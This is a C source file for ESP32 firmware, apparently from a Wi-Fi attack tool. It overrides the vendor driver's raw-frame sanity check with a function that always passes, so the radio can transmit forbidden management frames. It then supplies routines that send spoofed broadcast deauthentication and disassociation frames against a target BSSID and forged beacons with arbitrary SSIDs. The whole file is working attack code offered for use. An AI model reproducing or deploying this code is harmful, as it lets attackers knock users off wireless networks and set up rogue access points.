#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <string.h>

/* Override of the driver's private frame-type gate (WSL bypass).
 * Never called - its mere presence at link time replaces the one in the
 * Wi-Fi binary, so esp_wifi_80211_tx() stops rejecting mgmt subtypes.
 * Requires -Wl,-zmuldefs (added in main/CMakeLists.txt). */
int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2,
                                     int32_t arg3);

int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2,
                                     int32_t arg3) {
    (void)arg1;
    (void)arg2;
    (void)arg3;
    return 0; /* allow every frame type through */
}

/* Raw management-frame header: FC(2) dur(2) addr1(6) addr2(6) addr3(6)
 * seq(2) then caller payload. addr2/addr3 are patched with the BSSID. */
static void mgmt_header(uint8_t *f, uint8_t fc0, const uint8_t bssid[6]) {
    f[0] = fc0;
    f[1] = 0x00;
    f[2] = 0x3a;
    f[3] = 0x01;
    memset(f + 4, 0xff, 6);          /* addr1: broadcast */
    memcpy(f + 10, bssid, 6);        /* addr2: source = BSSID */
    memcpy(f + 16, bssid, 6);        /* addr3: BSSID */
    f[22] = 0xf0;                    /* sequence control */
    f[23] = 0xff;
}

esp_err_t wsl_send_raw(const uint8_t *frame, int len) {
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
}

void wsl_send_deauth(const uint8_t bssid[6]) {
    uint8_t f[26];
    mgmt_header(f, 0xc0, bssid);     /* mgmt / deauth */
    f[24] = 0x02;                    /* reason: prev auth not valid */
    f[25] = 0x00;
    wsl_send_raw(f, (int)sizeof(f));
}

void wsl_send_disassoc(const uint8_t bssid[6]) {
    uint8_t f[26];
    mgmt_header(f, 0xa0, bssid);     /* mgmt / disassoc */
    f[24] = 0x01;                    /* reason: unspecified */
    f[25] = 0x00;
    wsl_send_raw(f, (int)sizeof(f));
}

void wsl_send_beacon(const uint8_t bssid[6], const char *ssid, int channel) {
    size_t slen = ssid ? strlen(ssid) : 0;
    if (slen > 32)
        slen = 32;
    size_t len = 38 + slen + 3;
    if (len > 120)
        return;
    uint8_t f[128];
    memset(f, 0, sizeof(f));
    f[0] = 0x80;                     /* mgmt / beacon */
    f[1] = 0x00;
    f[2] = 0x00;
    f[3] = 0x00;
    memset(f + 4, 0xff, 6);          /* addr1: broadcast */
    memcpy(f + 10, bssid, 6);        /* addr2: source = BSSID */
    memcpy(f + 16, bssid, 6);        /* addr3: BSSID */
    f[22] = 0x00;
    f[23] = 0x00;
    /* timestamp (8) */
    f[32] = 0x64;                    /* beacon interval 100 TU */
    f[33] = 0x00;
    f[34] = 0x01;                    /* capability: ESS */
    f[35] = 0x04;
    f[36] = 0x00;                    /* SSID tag */
    f[37] = (uint8_t)slen;
    if (slen)
        memcpy(f + 38, ssid, slen);
    size_t o = 38 + slen;
    f[o++] = 0x03;                   /* DS parameter set */
    f[o++] = 0x01;
    f[o++] = (uint8_t)channel;
    wsl_send_raw(f, (int)o);
}